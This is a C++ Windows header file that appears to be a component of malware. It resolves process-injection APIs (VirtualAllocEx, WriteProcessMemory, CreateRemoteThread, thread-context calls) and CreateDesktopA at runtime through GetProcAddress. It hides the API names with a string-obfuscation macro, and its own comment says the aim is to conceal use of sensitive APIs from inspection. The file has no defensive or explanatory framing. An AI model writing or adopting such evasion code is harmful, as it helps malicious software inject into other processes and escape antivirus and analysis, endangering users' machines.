#ifndef API_LOADER_H
#define API_LOADER_H

#include <windows.h>
#include <string>
#include "obfuscation.h"

// Dynamic API Resolver
// Hides usage of sensitive APIs like VirtualAllocEx, WriteProcessMemory, etc.

namespace WinApi {

    typedef LPVOID (WINAPI *pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL (WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    typedef HANDLE (WINAPI *pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    typedef BOOL (WINAPI *pGetThreadContext)(HANDLE, LPCONTEXT);
    typedef BOOL (WINAPI *pSetThreadContext)(HANDLE, const CONTEXT*);
    typedef DWORD (WINAPI *pResumeThread)(HANDLE);
    typedef HDESK (WINAPI *pCreateDesktopA)(LPCSTR, LPCSTR, LPDEVMODEA, DWORD, ACCESS_MASK, LPSECURITY_ATTRIBUTES);
    
    // Helper to get function address
    static FARPROC GetProc(const char* mod, const char* func) {
        HMODULE hMod = GetModuleHandleA(mod);
        if (!hMod) hMod = LoadLibraryA(mod); // Fallback if not loaded
        return GetProcAddress(hMod, func);
    }

    static LPVOID VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
        static pVirtualAllocEx fn = (pVirtualAllocEx)GetProc(_S("kernel32.dll"), _S("VirtualAllocEx"));
        if (fn) return fn(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
        return NULL;
    }

    static BOOL WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten) {
        static pWriteProcessMemory fn = (pWriteProcessMemory)GetProc(_S("kernel32.dll"), _S("WriteProcessMemory"));
        if (fn) return fn(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
        return FALSE;
    }

    static HANDLE CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
        static pCreateRemoteThread fn = (pCreateRemoteThread)GetProc(_S("kernel32.dll"), _S("CreateRemoteThread"));
        if (fn) return fn(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
        return NULL;
    }
    
    static BOOL SetThreadContext(HANDLE hThread, const CONTEXT* lpContext) {
        static pSetThreadContext fn = (pSetThreadContext)GetProc(_S("kernel32.dll"), _S("SetThreadContext"));
        if (fn) return fn(hThread, lpContext);
        return FALSE;
    }

    static BOOL GetThreadContext(HANDLE hThread, LPCONTEXT lpContext) {
        static pGetThreadContext fn = (pGetThreadContext)GetProc(_S("kernel32.dll"), _S("GetThreadContext"));
        if (fn) return fn(hThread, lpContext);
        return FALSE;
    }
    
    static HDESK CreateDesktopA(LPCSTR lpszDesktop, LPCSTR lpszDevice, LPDEVMODEA pDevmode, DWORD dwFlags, ACCESS_MASK dwDesiredAccess, LPSECURITY_ATTRIBUTES lpsa) {
        static pCreateDesktopA fn = (pCreateDesktopA)GetProc(_S("user32.dll"), _S("CreateDesktopA"));
        if (fn) return fn(lpszDesktop, lpszDevice, pDevmode, dwFlags, dwDesiredAccess, lpsa);
        return NULL;
    }
}

#endif
